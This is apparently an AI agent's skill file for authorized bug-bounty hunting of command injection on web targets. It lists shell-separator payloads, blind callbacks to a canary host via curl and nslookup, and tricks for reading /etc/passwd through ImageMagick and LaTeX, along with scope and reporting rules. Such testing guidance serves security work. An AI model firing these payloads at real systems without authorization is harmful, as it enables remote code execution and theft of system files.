---
name: cmd-injection
description: "Focused hunt for OS command and code injection: command separators, subshells, argument injection into binaries, and shell metacharacters in params processed server-side. Use when the focus is RCE via command execution on a web target. Not for SQLi (use sqli), SSTI (use ssti), or file upload webshells (use file-upload)."
---

# Command / Code Injection

## When to use

- "Hunt RCE on X", "test command injection on X"
- Suspect sinks: file conversion (image/PDF/AV), ping/traceroute/DNS lookup features, importers, archive extraction, print queues, filename processing

## When NOT to use

- DB queries (`sqli`), templates (`ssti`), webshells via upload (`file-upload`)

## Inputs

- **Target** + params list; a canary/callback endpoint you control for blind proof

## Rationalizations to reject

- "Response took longer" — delay can be anything (queue, network). Command injection is proven by output, a controlled callback, or a reproducible two-run timing differential with clean baselines.
- "I got output" — confirm it's from the target server (canary marker with the command, e.g. `id; echo bbcmd<rand>`), not an unrelated echo of your payload.

## Methodology

### 1. Sink candidates
Params whose values plausibly reach a shell or interpreter: filenames, conversion options (`format`, `quality`, `resize`), hostnames/IPs for connectivity tools, cron/expression inputs, export filters, zip/password fields for protected archives.

### 2. Separator and syntax probing
Payloads: `;id`, `|id`, `&&id`, `` `id` ``, `$(id)`, newline (`%0a` + command), `||id`. URL/body contexts: also test inside quoted args (`";id;"`, `'$(id)'`).
- Windows: `&dir`, `&&dir`, `|dir`, `%0a`.
- Argument injection first: `--help` on the invoked binary (e.g. imagemagick `convert` `--%` tricks) — often cleaner than shell separators.

### 3. Proof without noise
- Output-based: marker echo (`id; echo BB<rand>`), `whoami` output in response.
- Blind: command that triggers your canary (`curl https://canary/BB<rand>`, `nslookup BB<rand>.canary.com`). One unique marker per sink so you know which feature fired.
- Avoid `sleep` as primary proof; if used, 2s max with baseline comparison, twice.

### 4. Format-specific injection points
- ImageMagick/graphics: `file.png` with SVG/MTV content, `https://` delegate, `@` file reads (`@/etc/passwd` as filename in some tools).
- FFmpeg/AV: HLS playlists and headers (also SSRF lead), file paths with `concat:` protocol.
- Archives: zip entry filenames (`;` in entry name), password fields reaching `unzip`/`7z`.
- LaTeX/report generators: `\input{/etc/passwd}`, `\write18`.

### 5. Chain check
Confirm the execution context (user, container, egress). Record `id`-equivalent output. Don't pivot further unless asked.

## Reporting

`findings/cmd-injection-<date>.md`. RCE = critical; blind confirmed = high. Include the marker/proof used.

## Focus discipline

Server fetching your URL without command context → `ssrf`. Template evaluation → `ssti`.
